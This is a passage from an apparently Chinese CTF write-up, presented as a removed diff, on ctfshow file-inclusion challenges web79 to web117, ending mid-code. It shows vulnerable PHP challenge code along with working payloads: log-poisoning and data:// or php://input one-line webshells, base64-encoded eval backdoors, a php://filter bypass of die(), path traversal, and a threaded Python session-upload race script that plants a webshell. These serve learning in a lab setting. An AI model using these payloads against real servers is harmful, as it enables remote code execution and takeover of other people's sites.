-<p>使用Burp进行抓包，并修改 User-Agent 为 <code>&lt;?php @eval($_GET[cmd]);echo PHP_DATADIR;?&gt;</code></p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_2.png" alt="image_2"></p>
-
-
-<p>再次访问可以看到即可查看 PHP 的执行路径。</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_3.png"></p>
-
-
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=file:///var/log/nginx/access.log&amp;cmd=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_4.png"></p>
-
-
-<p>也可以直接执行</p>
-<p>pay</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>代码会将php，替换为？？？</p>
-<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>方法同上。利用Burp将恶意代码上传，然后直接进行命令执行。</p>
-<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>我们在网址加上参数 <code>?file=PHP://input</code>，利用burp抓包,添加命令</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_5.png"></p>
-
-
-<p>修改命令为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>得到flag</p>
-<p><img src="/image/image_6.png"></p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_6.png"></p>
-
-
-<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>学习到 2 种思路。一是利用特殊的 PHP 语言标记，二是利用编码绕过。</p>
-<h4 id="特殊的-PHP-语言标记"><a href="#特殊的-PHP-语言标记" class="headerlink" title="特殊的 PHP 语言标记"></a>特殊的 PHP 语言标记</h4><p>常见的 PHP 语言标记有如下几种：</p>
-<ul>
-<li><code>&lt;?php phpinfo() ?&gt;</code>：如果只含有 PHP 代码， <code>?&gt;</code> 不允许存在。<code>?&gt;</code> 隐含一个 <code>;</code>，所以最后一句可以不用分号。</li>
-<li><code>&lt;script language=“php”&gt;phpinfo()&lt;script&gt;</code>。</li>
-<li><code>&lt;? ?&gt;</code>：需要修改 PHP 的 <code>short_open_tag</code> 配置</li>
-<li><code>&lt;% %&gt;</code>：默认禁用。</li>
-<li><code>&lt;?=$variablename ?&gt;</code>：默认可用。</li>
-<li><code>&lt;%=$variablename  %&gt;</code>：默认禁用。</li>
-</ul>
-<p>pay</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>将上面的pay改成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>出现 data的话就会被替换掉</p>
-<p><strong>php:&#x2F;&#x2F;input</strong>还可以用，只是目录下的flag.php ——&gt; fl0g.php</p>
-<p>**file:&#x2F;&#x2F;**协议也可以用</p>
-<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>连<code>：</code>都过滤了</p>
-<p>%3A</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?file=data%<span class="number">3</span>A<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
-
-
-<p><strong>Hint</strong>：包含日志文件 进行getshell 日志文件路径： <code>?file=/var/log/nginx/access.log</code></p>
-<p>直接用file：进行命令执行看看</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[cmd]);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_7.png"></p>
-
-
-<p>需要你自己加上空格（%20），直接加空格就会截断，后面就没办法反应。</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_8.png"></p>
-
-
-<h1 id="web83-web86"><a href="#web83-web86" class="headerlink" title="web83 - web86"></a>web83 - web86</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 20:28:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>估计是session_destroy()被禁用了，页面显示报错</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>脚本跑不出来</p>
-<p>脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://93a5ba3f-7aea-4855-8fa3-5ecc6311ef67.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">proxy=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,</span><br><span class="line">            data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        resposne2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>写个上传脚本</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://b9fddb46-a4f3-49d7-a06d-18463c73ebf3.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>然后抓包，加一下<code>PHPSESSID</code>，在送去爆破就可以了</p>
-<p>方法没有做出来。</p>
-<h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>die 函数 等同于 exit()：exit 函数输出一个消息并且退出当前脚本。脚本会我们传入的content参数中加入die，从而让我们无法利用写入的一句话木马。</p>
-<p>存在urldecode（）函数，我们需要进行URL编码</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=1.php</span><br><span class="line">进行URL全编码</span><br><span class="line">？file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[pass]);?&gt;</span><br><span class="line">写成</span><br><span class="line">之所以加上nb，是因为要把不需要的代码给解码掉，是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个</span><br><span class="line">content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>将此传上去，就可以成功了</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_9.png"></p>
-
-
-<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>直接改变之前的代码了，就过滤了php，还有过滤了一些符号。</p>
-<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>data：&#x2F;&#x2F; 伪协议</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>进行base64编码，记住去除等号</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//db7b5767-69bb-4227-a74f-12e3e60bbed1.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>传入一句话木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>进行base64编码，</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9QSFAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span></span><br></pre></td></tr></table></figure>
-
-
-<p>传上直接getshell</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_10.png" alt="image_10"></p>
-
-
-<h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>misc+lfi</p>
-<p>就是一道misc题目吧</p>
-<p>进去是一短视</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_11.png"></p>
-
-
-<p>好怀念的说</p>
-<p>直接使用file伪协议</p>
-<p>开始我使用常用的，没有回显，我就是只剩下flag.php，就出来了。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/../../../../../../flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_12.png"></p>
-
-
-<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes 